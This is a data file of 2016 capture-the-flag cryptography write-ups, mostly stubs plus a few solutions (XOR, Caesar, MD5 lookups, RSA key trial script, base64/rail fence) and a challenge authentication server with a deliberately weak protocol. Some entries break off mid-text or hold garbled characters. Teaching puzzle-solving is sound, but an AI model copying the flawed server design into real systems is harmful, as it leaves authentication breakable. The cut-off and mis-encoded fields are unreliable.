{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\mma-ctf-2nd-2016\\reverse\\backdoored-crypto-system-400", "year": "2016", "name": "backdoored-crypto-system-400", "writeup": "# MMA CTF 2nd 2016 : backdoored-crypto-system-400\n\n**Category:** Reverse Crypto\n**Points:** 400\n**Solves:** 3\n**Description:**\n\n> Get the flag.\n>\n>\n> [[bcs.7z](./bcs.7z)]([bcs.7z](./bcs.7z))\n>\n>\n> $ nc bcs.chal.ctf.westerns.tokyo 3971\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/tokyo-westernsmma-ctf-2016-backdoored-crypto-system-reversecrypto-400/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nuitduhack-quals-2016\\cryptography\\toil33t", "year": "2016", "name": "toil33t", "writeup": "# Nuit du Hack CTF Quals : toil33t\n\n**Category:** Cryptography\n**Points:** 400\n**Solves:** 65\n**Description:**\nHey ! I really want to buy a toil33t, however it is not available yet! :( Can you access to the administrative page and take one for me?\n\nThe challenge is available at http://toil33t.quals.nuitduhack.com\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://www.asafety.fr/cryptologie/ctf-ndh-2016-quals-write-up-cryptography-toil33t/\n* https://github.com/TechSecCTF/writeups/blob/master/NuitDuHack2016/toil33t.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nullcon-hackim-2016\\crypto\\crypto-1-500", "year": "2016", "name": "crypto-1-500", "writeup": "# nullcon HackIM : Crypto Question 1\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> You are in this GAME. A critical mission, and you are surrounded by the beauties, ready to shed their slik gowns on your beck. On onside your feelings are pulling you apart and another side you are called by the duty. The biggiest question is seX OR success? The signals of subconcious mind are not clear, cryptic. You also have the message of heart which is clear and cryptic. You just need to use three of them and find whats the clear message of your Mind... What you must do?\n>\n>\n> [crypto1.zip](./crypto1.zip)\n\n\n## Write-up\n\nby [steelsoldat](https://github.com/steelsoldat)\n\nFrom the description it can be deduced that this is probably a XOR challenge. Since we are given the Heartclear and Heartcrypt files XORing the crypt with the plaintext gives us the following key:\n\n```\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you are looking for.\nIts right there what you a\n```\n\nWhile it is beyond creepy we can then xor Mindcrypt with the key and get the following\n\n```\nhttps://play.google.com/store/apps/collection/promotion_3001629_watch_live_games?hl=en\nithjo(qs1ob+Z>q3y.)l\u0006yf1\"vU#npdS.ie7;ZS6D9\n                                         h\u0010Fhspu;-5alby*a*6q$;1s\"6<zv~+$.ytho\u0006~p7?\u0017Gsi/vsmw~tjojYvi(,w'kC8x;mqS\"b9l[|!\n\u0001to5s6h0l-a12zoqvaz/ym1:{z7#,|1\u0011S5woxjp%0^Kr\noujp~(rs5i'rB#0&S\n```\n\nAnd with the risky click of the day we visit the link and see the following header **Never Miss a Game** which is our flag.\n\n## Other write-ups and resources\n\n* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-1-500-points/>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_1#eng-version)\n* <https://www.xil.se/post/hackim-2016-crypto-1-arturo182/>\n* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-1/>\n* <http://www.cnblogs.com/Christmas/p/5176496.html>\n* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/crypto%201/crypto_1.md>\n* <https://github.com/Desiprox/NullCon-2016/tree/master/crypto_1>\n* [0x90r00t](https://0x90r00t.com/2016/02/03/hackim-2016crypto-500-crypto-question-1-write-up/)\n* <http://err0r-451.ru/hackim-crypto-question-1/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nullcon-hackim-2016\\crypto\\crypto-2-400", "year": "2016", "name": "crypto-2-400", "writeup": "# nullcon HackIM : Crypto Question 2\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n> Some one was here, some one had breached the security and had infiltrated here. All the evidences are touched, Logs are altered, records are modified with key as a text from book.The Operation was as smooth as CAESAR had Conquested Gaul. After analysing the evidence we have some extracts of texts in a file. We need the title of the book back, but unfortunately we only have a portion of it...\n>\n>\n> [The_extract.txt](./The_extract.txt)\n\n\n## Write-up\n\nby [steelsoldat](https://github.com/steelsoldat)\n\nAfter reading the description it was pretty clear this was a Caesar cipher. Upon throwing 'The_extract.txt' into [Xarg's Caesar decrypter](http://www.xarg.org/tools/caesar-cipher/) we can recover what seems like an [excerpt from a book](./The_text.txt)(which would match the problem description).\n\nAfterwards we can throw the first sentence of the plaintext into Google Books, where we are met with multiple books, but the first result 'In the Shadow of Greed' is the correct flag!\n\n## Other write-ups and resources\n\n* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-2-400-points/>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_2#eng-version)\n* <https://www.xil.se/post/hackim-2016-crypto-2-arturo182/>\n* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-2/>\n* <https://github.com/Team-Sportsball/CTFs-2016/blob/master/nullcon-hackim-2016/crypto_2/crypto_2.md>\n* <https://github.com/Desiprox/NullCon-2016/tree/master/crypto_2>\n* [Chinese](http://www.cnblogs.com/Christmas/p/5176509.html)\n* [0x90r00t](https://0x90r00t.com/2016/02/03/hackim-2016crypto-400-crypto-question-2-write-up/)\n* <http://err0r-451.ru/hackim-crypto-question-2-400pts/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nullcon-hackim-2016\\crypto\\crypto-3-400", "year": "2016", "name": "crypto-3-400", "writeup": "# nullcon HackIM : Crypto Question 3\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n> After entring the luxurious condomium,you get the feel that you are in home of a yester Star. the extravagant flooring and furnishings shows the richness of this star. But where is she? There she is, lying peacefuly on her couch. See what Envy has done to her...with a perfectly well maintained attractive body she still looks sex diva, except for her face beyond recogniton. Her identity is crucial to know who killed her and why? In absence of any personal data around there is only a file. with a cryptic text in it. Preity sure she has used her own name to XOR encrypt the file. And challenge is to know her name.\n>\n>\n> [AncientSecretsOfTheKamaSutra.txt](./AncientSecretsOfTheKamaSutra.txt)\n\n\n## Write-up\n\nby [steelsoldat](https://github.com/steelsoldat)\n\nCrypto 3: We're given a text file that we can't read 'AncientSecretsOfTheKamaSutra.txt'\n\nUpon googling the name of the text file we *come* up with a 1997 Adult Film.\nThe hints tell us someone was dead over a couch, but luckily you dont need to watch the porno to find out if that is a scene in the film.\n\nI began xoring the contents of the text file with various star names(first with in-film names) then converting the reverting hex to ascii\n\nUpon xoring with 'Jeanna Fine' we get a huge block of hex\n\n```\na5dadc7e636b274d282f4d476f2f58104e33422073241946702067020ca9d6d324476f606a3d496e5c2c0340466a68207b29030f706a1620746865792077616e74203440246d652361124762720f184a657b2f3a4886d1d86762607c44432d4c7f207f43205e27636b2422036a60476f2f6221552c086d0a4b0f747a726a8e9ffb5f6b6e4e1c5e796a2f214986d1d878646a62160b36427f2068402c41622e2479632c7b63417d8ed1d3402608780b0f5b6c6a20636b6962726172390f7367657d24a9d6d3574b6e7d44568e9ffb86d1d8476f2f81d1dccff9d44a634b6b4b45696f3b5c282f4d476f6681d1dc44782c7c6e476f722b5c7b6e4b63020f5b6c6a2044200b4e27581a74728ed1d3236e433c5a8af5d88ed1d3630a7e86d1d8a5dadc6364662f010f7363a5dadc1d04712f4186d1d85f204973696c2a2242676840722f792754cff9d4742021416766658e9ffb7c81daf76a6663646d4b2c7b676e56618ed1d353214d754442a5dadc6a742fcff9d481daf74e8ed1d37c313e4678770a2b54264d28234a1050724e787c2f2952cff9d4636fa5dadc17044e34446e6a8af5d84669636b651f5781daf7726a2081de9d084b277fa5dadc05476c2a4274207002466520400a074228537e5f374627738e9ffb00568af5d87473208e9ffb274c2c488aded3054f360773686107037c6f2b060b4d71207b476f204b627c653b4b81daf7766a207b29035627660a6574206d616e7920706568401f4781d1dc615f6f608af5d8577561675e656f81daf767637681de9d74656163280f70676562610b4e69720f0244796a2f05a9d6d3286d2c5c7e1059240774656718467c73258e9ffb0e2b535662743a4d666e411a044a4e6a8ed1d36e612046696e250f0e\n```\n\nthat turns into the following ASCII\n```\nÂ¥ÃšÃœ~ck'M(/MGo/X\u0010N3B s$\u0019Fp g\u0002\fÂ©Ã–Ã“$Go`j=In\\,\u0003@Fjh {)\u0003\u000fpj\u0016 they want 4@$me#a\u0012Gbr\u000f\u0018Je{/:HÂ†Ã‘Ã˜gb`|DC-L C ^'ck$\"\u0003j`Go/b!U,\bm\nK\u000ftzrjÂŽÂŸÃ»_knN\u001c^yj/!IÂ†Ã‘Ã˜xdjb\u0016\u000b6B h@,Ab.$yc,{cA}ÂŽÃ‘Ã“@&\bx\u000b\u000f[lj ckibrar9\u000fsge}$Â©Ã–Ã“WKn}DVÂŽÂŸÃ»Â†Ã‘Ã˜Go/ÂÃ‘ÃœÃÃ¹Ã”JcKkKEio;\\(/MGofÂÃ‘ÃœDx,|nGor+\\{nKc\u0002\u000f[lj D \u000bN'X\u001at"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nullcon-hackim-2016\\crypto\\crypto-4-200", "year": "2016", "name": "crypto-4-200", "writeup": "# nullcon HackIM : Crypto Question 4\n\n**Category:** Crypto\n**Points:** 200\n**Solves:**\n**Description:**\n\n> He is influential, he is powerful. He is your next contact you can get you out of this situation. You must reach him soon. Who is he? The few pointers intrecpted by KGB are in the file. Once we know him, we can find his most valuable possession, his PRIDE.\n>\n>\n> [whatsHisPride.md5s](./whatsHisPride.md5s)\n\n\n## Write-up\n\nby [steelsoldat](https://github.com/steelsoldat)\n\nOpening the file attatched leads to a list of MD5 hashes. After running them through a rainbow table they come out to the following\n* d80517c8069d7702d8fdd89b64b4ed3b : Carrie\n* 088aed904b5a278342bba6ff55d0b3a8 : Grease\n* 56cdd7e9e3cef1974f4075c03a80332d : Perfect\n* 0a6de9d8668281593bbd349ef75c1f49 : Shout\n* 972e73b7a882d0802a4e3a16946a2f94 : Basic\n* 1cc84619677de81ee6e44149845270a3 : Actor\n* b95086a92ffcac73f9c828876a8366f0 : Aircraft\n* b068931cc450442b63f5b3d276ea4297 : name\n\nAfter we take those words and plug them into Google the first result is John Travolta, which matches the problem description of an influential man. Next we need to find out what his PRIDE is. The terms all seemed to be related to his acting career other than the last two words: Aircraft, and name.\n\nLooking at his [Wikipdea page](https://en.wikipedia.org/wiki/John_Travolta) we can see he does own a plane, which has a name. *\"He owns five aircraft, including an ex-Qantas Boeing 707-138 airliner that bears the name Jett Clipper Ella in honor of his children\"*\n\nThe name of his aircraft is the flag! Jett Clipper Ella\n\n## Other write-ups and resources\n\n* <https://cryptsec.wordpress.com/2016/01/31/hackim-ctf-2016-write-up-crypto-question-4-200-points/>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/crypto_4#eng-version)\n* <http://h4ckx0re-ctf-crew.co.nf/2016/01/31/hackim-ctf-2016-crypto-4/>\n* <http://err0r-451.ru/hackim-crypto-question-4-200pts/>\n* [Chinese](http://www.cnblogs.com/Christmas/p/5176564.html)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\nullcon-hackim-2016\\crypto\\crypto-5-500", "year": "2016", "name": "crypto-5-500", "writeup": "# nullcon HackIM : Crypto Question 5\n\n**Category:** Crypto\n**Points:** 500\n**Solves:**\n**Description:**\n\n> Now you are one step away from knowing who is that WARRIOR. The Fighter who will decide the fate of war between the 2 countries. The Pride of One and Envey of the Other... You have got the secrete file which has the crucial information to identify the fighter. But the file is encrypted with a RSA-Private key. Good news you have its corresponding public key in a file. Bad news there are 49 other keys. Whos is the Fighter.\n>\n>\n> [crypto5.zip](./crypto5.zip)\n\n\n## Write-up\n\nby [unicornasfuel](https://github.com/unicornsasfuel)\n\ncrypto5.zip contains two files: `warrior.txt` and `all_keys.txt`.\n\nThe keys are all RSA public keys, in ASCII-armored format. They are all the same keylength, and as such occupy the same number of lines in the file per key, making it easy to carve out each key. As there are only 50 keys, we can use an exhaustive search method to determine which is the correct key, attempting to decrypt the ciphertext with each one.\n\nWhile we would normally apply a plaintext scoring system to programmatically determine which is the most likely candidate for successful decryption, there are so few keys that we can simply spit out all the candidate decryptions and then scroll through them until we see text.\n\nSeveral challengers were confused about the statement that the message was encrypted with the private key, being under the impression that private keys cannot be used to encrypt under RSA. In reality, either key in a keypair can be used as the private or public component. Since the encryption and decryption operations do not differ except in the use of the other half of the keypair, we can use standard libraries to \"encrypt\" the data with each public key in order to decrypt it.\n\nWe can use Python and PyCrypto to solve the puzzle, like so:\n\n~~~Python\nfrom Crypto.PublicKey import RSA\n\nciphertext_fh = open('warrior.txt','r')\nciphertext = ciphertext_fh.read()\nciphertext_fh.close()\n\nkey_fh = open('all_keys.txt','r')\nkey = ''\nfor line_counter in range(9):\n   key += key_fh.readline()\n\nwhile key != '':\n   cipher = RSA.importKey(key)\n   print repr(cipher.encrypt(ciphertext, 'dummy')) # dummy second argument for compatibility\n   key = ''\n   for line_counter in range(9):\n      key += key_fh.readline()\n~~~\n\nWe search through the resulting outputs for the word \"the\", and find a properly padded decrypted message:\n\n~~~\n(\"\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00This fighter is a designation for two separate, heavily upgraded derivatives of the Su-35 'Flanker' jet plane. They are single-seaters designed by Sukhoi(KnAAPO).\\n\",)\n~~~\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\open-ctf-2016\\crypto\\basic_obfuscation-50", "year": "2016", "name": "basic_obfuscation-50", "writeup": "# OpenCTF : basic_obfuscation\n\n**Category:** Tasks\n**Points:** 50\n**Solves:** 10\n**Description:**\n\nWe found this message, can you decode it?\n\n3xvsw8su9k7xlcq39w38uv33q5u5dt260uwb81mwnjjeiku8emau2788t\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://ctftime.org/writeup/3656 \n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\open-ctf-2016\\crypto\\message-(partially)-received-150", "year": "2016", "name": "message-(partially)-received-150", "writeup": "# OpenCTF : Message (partially) Received\n\n**Category:** Tasks\n**Points:** 150\n**Solves:** 1\n**Description:**\n\nWe've already given you everything you need to log in, except the flag.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\open-ctf-2016\\crypto\\novice_obfuscation-100", "year": "2016", "name": "novice_obfuscation-100", "writeup": "# OpenCTF : novice_obfuscation\n\n**Category:** Tasks\n**Points:** 100\n**Solves:** 2\n**Description:**\n\nWe found this message, can you decode it?\n\nzccnxyzbxpcclqzczlxszcczxhzkzlzkcncbxmlqxcxhzbxdcczszclqckzsxllqxyckxmzhlqzbcczsxyzlczcdxnzkxhxqxmcllqcbxxlqzbxdzlxmbv\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "Hash", "path": "data\\write-ups-2016\\open-ctf-2016\\pwning\\hashing_the_stack-300", "year": "2016", "name": "hashing_the_stack-300", "writeup": "# OpenCTF : hashing_the_stack\n\n**Category:** Tasks\n**Points:** 300\n**Solves:** 3\n**Description:**\n\nA new twist on an old classic.\n\n172.31.0.10/hashthestack_d58803b5a360cc1a648f75f0f922a4d5\n\nRunning on 172.31.1.30:1800\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pentest-cyprus-2\\crypto\\arbok-200", "year": "2016", "name": "arbok-200", "writeup": "# PentestCyprus 2.0 | Arbok\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 200\n**Description:** \nDid you know that Arbok speaks Hebrew?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pentest-cyprus-2\\crypto\\binacle-30", "year": "2016", "name": "binacle-30", "writeup": "# PentestCyprus 2.0 | Binacle\n\n**Category:** Crypto\n**Points:** 30\n**Solves:** 30\n**Description:** \nAfter you have gained access to the PlayMon, finding Binacle should be a matter of conversion.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pentest-cyprus-2\\crypto\\caterpie-90", "year": "2016", "name": "caterpie-90", "writeup": "# PentestCyprus 2.0 | Caterpie\n\n**Category:** Crypto\n**Points:** 90\n**Solves:** 90\n**Description:** \nDid you know that Pokestore owner is posting flags in social media?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pentest-cyprus-2\\crypto\\teaser", "year": "2016", "name": "teaser", "writeup": "# PentestCyprus 2.0 | Crypto Teaser\n\n**Category:** Crypto\n**Points:** N/A\n**Solves:** N/A\n**Description:**\n\n> Where could it be?\n\n## Write-up\n\nThe challenge description doesn't say much so we inspect the page source for any hints.  \nWe can easily spot the following element: `<img data-message=\"Let's see what you've got!\" data-type=\"Cryptography\" data-id=\"CRYPTO010T\" style=\"position:absolute;top:-333px;left:-333px;\" src=\"data:image/gif;base64,VSB2cGwgc...\">`  \nWe then open the image src in a new tab but it dosn't look like a real image so we get the base64 part and do a simple base64 decode  \nThe decoded part is the following:\n\n>U vpl rukst ex p ilxnrhdhyulm mh cuw p ikhykpf mrpm celssfst mh rpqs \"lmkpgys homiom\" vkummsg ex hgs hc rul sw-ykpt lmotsgml. Um vpl p ikhykpf mrpm ksptl p tpmp cuds, plbl pehom 50 joslmuhgl, thsl lhfs npdnodpmuhgl, pgt nhfsl oi vumr lhfs lnhks eplst hg mrul IrT'l kslspknr. Um'l hg p kslspknr 3E2 pm mrs oguqsklumx. Rs tsfhglmkpmsl mrs ikhykpf pgt loks sghoyr mrsks lssfst mh es lmkpgys cdplrugy vhktl hg mrs lnkssg vrsg um fhqsl ckhf joslmuhg mh joslmuhg, pgt mrsx thg'm lssf guns. U pykss mh th um, lrhodt es iksmmx lmkpuyrmchkvpkt, lh rs'dd ipx fs ex mrs rhok mh tsmskfugs rhv euy mrs cuw ul pgt mrsg vs'dd pykss mh p css.\n>\n>Tpx 1\n>U lum thvg pm mrs 3E2 pgt dhyug mh mrs sw-ykpt lmotsgm'l pnnhogm mrpm rpl essg yuqsg mh fs. Mrul ul vrsks mrs nhts kslutsl. U swpfugs mrs N nhts. Um ul vkummsg mh es8t rpkt mh kspt. Pdd mrs nhts ul ljoulrst hg hgs dugs. Um'l likspt hqsk 15 cudsl vumr pehom 3 cognmuhgl isk cuds -- pdd hg hgs dugs. Pdd qpkupeds gpfsl pks aolm mrkss, lssfugydx kpgthf, dsmmskl. U mpdb mh mrs yox pgt pykss mh yh vumr rhokdx hg mrul (ykspm tsnuluhg). U ogmpgyds pdd mrs nhts pgt chkfpm um gunsdx lh U npg lss um.\n>\n>Um vpl thgs hg iokihls. Um olst mrs noklsl duekpkx mh fhqs mh p ihugm hg mrs lnkssg, ikugm p joslmuhg pgt mrs pglvskl, pgt vpum chk p kslihgls. Eom um cuklm vsgm mh mrs cuklm dugs hc mrs joslmuhg, ikugmst lhfs vrums loiksfpnx fsllpys, vpumst 1/2 p lsnhgt, pgt mrsg hqskvkhms um vumr mrs joslmuhg. Mrul hoyrm mh es lufids. Mrsks pks hgdx pehom cuqs idpnsl um nhodt homiom pgxmrugy, pgt pdd hc mrsf rpt mrul loedufugpd cdplr hc p fsllpys. Spnr hgs vpl rpkt nhtst. Gh ikhedsf. Tsdsms mrs hccsgtugy fqikugmv() pgt pdd ul vsdd. Hk lrhodt es. U nhfiuds, mrugbugy U'f thgs. Eom vrsg U kpg um, mrsks um ul pypug -- mrs loedufugpd fsllpysl. Mrul mufs vumr tuccsksgm mswm lmudd mrs lpfs loeasnm, aolm tuccsksgm fsllpysl.\n>\n>U nrsnb fx nhts pgt esdusqs um hk ghm um'l epnb mh mrs ugumupd lmpms U chogt um. 15 cudsl, fpgydst, 3-dsmmsk qpkupedsl -- mrs vrhds mrugy kuyrm epnb vrsks U lmpkmst. U vpgm lrhhm fxlsdc chk ghm fpbugy p nhix hc fx nhts. U ogfpgyds pypug, mrul mufs iommugy um ug mrkss cudsl, gpfst tuccsksgmdx. U fpbs p nhix hc mrs vrhds tuksnmhkx, pgt U fpkb mrs cudsl ksptpeds hgdx. U nhfiudst um. Pdd dhhbl yhht. U kog mrs ikhykpf. Mrsks'l ghv p nhix hc mrs hkuyugpd 15 cudsl ug mrs tuksnmhkx pdhgy vumr fugs pgt mrs loedufugpd fs"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pentest-cyprus-2\\crypto\\weavile-20", "year": "2016", "name": "weavile-20", "writeup": "# PentestCyprus 2.0 | Weavile\n\n**Category:** Crypto\n**Points:** 20\n**Solves:** 20\n**Description:** \nGo to the Pokestore and search for Weavile. The flag is in plain text. You might need to zoom a bit though! \n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\plaidctf-2016\\crypto\\rabit-175", "year": "2016", "name": "rabit-175", "writeup": "# PlaidCTF 2016 : rabit\n\n**Category:** Crypto\n**Points:** 175\n**Solves:** 71\n**Description:**\n\n> Just give me a bit, the least significant's enough. Just a second weâ€™re not broken, just very, very insecure. Running at rabit.pwning.xxx:7763\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/x64x6a/ctf/tree/master/PlaidCTF%202016/rabit>\n* <https://gist.github.com/elliptic-shiho/9aba6a8f2869dea8a839a41ecc940fc0>\n* <http://blog.clark.re/2016/04/plaidctf-2016-rabit-write-up.html>\n* https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/crypto_rabit)\n* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/rabit/rabit.md\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\plaidctf-2016\\crypto\\radioactive-275", "year": "2016", "name": "radioactive-275", "writeup": "# PlaidCTF 2016 : radioactive\n\n**Category:** Crypto\n**Points:** 275\n**Solves:** 8\n**Description:**\n\n> We just got this fancy new cryptographic device and it seems to work greatâ€¦ for the most part. But sometimes the values it gives me are wrong. Maybe you could take a look for me.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/plaidctf-2016-radioactive-crypto-275/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\plaidctf-2016\\crypto\\sexec-300", "year": "2016", "name": "sexec-300", "writeup": "# PlaidCTF 2016 : sexec-300\n\n**Category:** Crypto\n**Points:** 300\n**Solves:** 3\n**Description:**\n\n> If you need to securely grant execution privileges, what better way to do it than sexec? \n> \n> \n> This is running on sexec.pwning.xxx:9999\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\plaidctf-2016\\crypto\\tonnerre-300", "year": "2016", "name": "tonnerre-300", "writeup": "# PlaidCTF 2016 : tonnerre\n\n**Category:** Crypto\n**Points:** 200\n**Solves:** 8\n**Description:**\n\n> We were pretty sure the service at tonnerre.pwning.xxx:8561 (source) was totally secure. But then we came across [this website](http://tonnerre.pwning.xxx:8560/) and now weâ€™re having second thoughts... We think they store the service users in the same database?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/x64x6a/ctf/tree/master/PlaidCTF%202016/tonnerre>\n* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/tonnerre>\n* <https://gist.github.com/Bono-iPad/124e7969d4f3ae0e0b4bd7518de7fd7b>\n* <https://duksctf.github.io/PCTF2016-tonnerre/>\n* <https://grocid.net/2016/04/17/plaidctf-tonnerre/>\n* https://github.com/TechSecCTF/writeups/blob/master/plaidctf2016/tonnerre/tonnerre.md\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/crypto_tonnerre)\n", "solution_code": "\n# public_server_ea2e768e20e89fb1aafbbc547cdb4636.py\n#/usr/bin/env python\n\nfrom Crypto.Random import random, atfork\nfrom Crypto.Hash import SHA256\n\nfrom database import import_permitted_users\n\nimport SocketServer,threading,os,time\n\nmsg = \"\"\"Welcome to the Tonnerre Authentication System!\\n\"\"\"\nflag = \"REDACTED\"\n\nN = 168875487862812718103814022843977235420637243601057780595044400667893046269140421123766817420546087076238158376401194506102667350322281734359552897112157094231977097740554793824701009850244904160300597684567190792283984299743604213533036681794114720417437224509607536413793425411636411563321303444740798477587L\ng = 9797766621314684873895700802803279209044463565243731922466831101232640732633100491228823617617764419367505179450247842283955649007454149170085442756585554871624752266571753841250508572690789992495054848L\n\npermitted_users = {}\n\n# This should import the fields from the data into the dictionary.\n# the dictionary is indexed by username, and the data it contains are tuples\n# of (salt, verifier) as numbers. note that the database stores these in hex.\nimport_permitted_users(permitted_users)\n\ndef H(P):\n  h = SHA256.new()\n  h.update(P)\n  return h.hexdigest()\n\ndef tostr(A):\n  return hex(A)[2:].strip('L')\n\nclass incoming(SocketServer.BaseRequestHandler):\n  def handle(self):\n    atfork()\n    req = self.request\n    req.sendall(msg)\n    username = req.recv(512)[:-1]\n    if username not in permitted_users:\n      req.sendall('Sorry, not permitted.\\n')\n      req.close()\n      return\n    public_client = int(req.recv(512).strip('\\n'), 16) % N\n    c = (public_client * permitted_users[username][1]) % N\n    if c in [N-g, N-1, 0, 1, g]:\n      req.sendall('Sorry, not permitted.\\n')\n      req.close()\n      return\n    random_server = random.randint(2, N-3)\n    public_server = pow(g, random_server, N)\n    residue = (public_server + permitted_users[username][1]) % N\n    req.sendall(tostr(permitted_users[username][0]) + '\\n')\n    req.sendall(tostr(residue) + '\\n')\n\n    session_secret = (public_client * permitted_users[username][1]) % N\n    session_secret = pow(session_secret, random_server, N)\n    session_key = H(tostr(session_secret))\n\n    proof = req.recv(512).strip('\\n')\n\n    if (proof != H(tostr(residue) + session_key)):\n      req.sendall('Sorry, not permitted.\\n')\n      req.close()\n      return\n\n    our_verifier = H(tostr(public_client) + session_key)\n    req.sendall(our_verifier + '\\n')\n\n    req.sendall('Congratulations! The flag is ' + flag + '\\n')\n    req.close()\n\nclass ReusableTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n  pass\n\nSocketServer.TCPServer.allow_reuse_address = True\nserver = ReusableTCPServer((\"0.0.0.0\", 8561), incoming)\nserver.timeout = 60\nserver.serve_forever()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\pragyan-ctf-2016\\cryptography\\bail-cipher-20", "year": "2016", "name": "bail-cipher-20", "writeup": "# Pragyan CTF 2016 : BAIL Cipher\n\n**Category:** Cryptography\n**Points:** 20\n**Solves:** \n**Description:**\n\n>  Bob and Alice have come up with a new encryption to communicate. But they want you to figure out if its possible to decipher their messages easily. Can you decipher it?\n> \n> \n>  VGF4ME9GaGxnIHdXMkZqaDVlZiBzeFFtNHY5IGlsdWI=\n> \n>  Hint! BAIL is made of BAse and raIL\n\n\n## Write-up\n\nBAIL Cipher itself says Base64 + Rail Cipher, So the Cipher initially given is `VGF4ME9GaGxnIHdXMkZqaDVlZiBzeFFtNHY5IGlsdWI=` , decoding it with base64 will give `Tax0OFhlg wW2Fjh5ef sxQm4v9 ilub` , Now keeping the Number of Rails = 4 , this would be the Flag `The flag is xwxlQW02mu4FOjvb9hF5`\n\n## Other write-ups and resources\n\n* none yet\n"}
